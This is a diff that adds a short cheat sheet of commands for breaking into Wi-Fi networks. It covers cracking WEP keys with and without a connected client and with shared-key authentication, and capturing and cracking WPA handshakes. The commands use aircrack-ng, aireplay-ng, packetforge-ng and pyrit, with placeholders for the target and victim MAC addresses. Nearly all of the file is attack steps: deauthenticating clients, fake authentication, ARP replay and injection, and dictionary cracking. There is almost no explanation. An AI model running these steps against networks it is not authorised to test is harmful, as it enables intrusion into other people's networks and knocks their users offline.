@@ -1,0 +1,47 @@
+Cracking WEP via Client:
+
+airodump-ng -c <AP> --bssid <AP MAC> -w capture.cap mon0    -   start sniffing
+aireplay-ng -1 0 -e <ESSID> -a  <AP MAC> -h <ATTACKING MAC> mon0 - Fake auth
+1) aireplay-ng -3 -b <AP MAC> -h <ATTACKING MAC> mon0 - arp request replay attack
+1) aireplay-ng -0 1 -a <AP MAC> -c <victim MAC> mon0 - Deauth the client
+aircrack-ng capture.cap - start cracking
+
+Method 2 via client:
+@ 1) aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0
+aircrack-ng -z capture.cap
+
+
+Cracking WEP NO CLIENT:
+
+airodump-ng -c <AP> --bssid <AP MAC> -w capture.cap mon0    -   start sniffing
+aireplay-ng -1 0 -e <ESSID> -a  <AP MAC> -h <ATTACKING MAC> mon0 - Fake auth
+Run KoreK chopchop or Fragmentation atack 
+packetforge-ng -0 -a <AP MAC> -h <ATTACKING MAC> -l <SOURCE IP> -k <DEST IP> -y <xor file> -w output - create arp request packet
+aireplay-ng -2 -r packetfilename mon0 - inject packet into network
+aircrack-ng capture.cap - start cracking
+
+
+Cracking WEP with SKA:
+airodump-ng -c <AP> --bssid <AP MAC> -w capture.cap mon0    -   start sniffing
+aireplay-ng -0 1 -a <AP MAC> -c <victim MAC> mon0 - Deauth the client to get XOR keystream
+aireplay-ng -1 0 -e <ESSID> -y <XOR FILE> -a <AP MAC> -h <ATTACKING MAC> mon0 - fake auth using xor keystream
+aireplay-ng -3 -b <AP MAC> -h <ATTACKING MAC> mon0 - arp request replay attack
+aireplay-ng -0 1 -a <AP MAC> -c <victim MAC> mon0 - Deauth the client
+aircrack-ng capture.cap - start cracking
+
+
+Cracking WPA:
+airodump-ng -c <AP> --bssid <AP MAC> -w capture.cap mon0    -   start sniffing
+aireplay-ng -0 1 -a <AP MAC> -c <victim MAC> mon0 - Deauth the client. Sniffing should show the 4-way handshake
+aircrack-ng -w wordlist.txt capture.cap - start cracking via dictionary or rambow tables
+
+
+pyrit -r catprue.cap analyize - see if handshake was catpured
+pyrit -r capture.cap -o <output.cap> strip - remove exccess data from file
+
+pyrit -i passwordlist.txt import_passwords - import passwords
+pyrit eval - check database passwords
+pyrit -e <essid> create_essid - create essid database
+pyrit batch - compute PMK
+
+pyrit -r capture.cap attack_db - start cracking
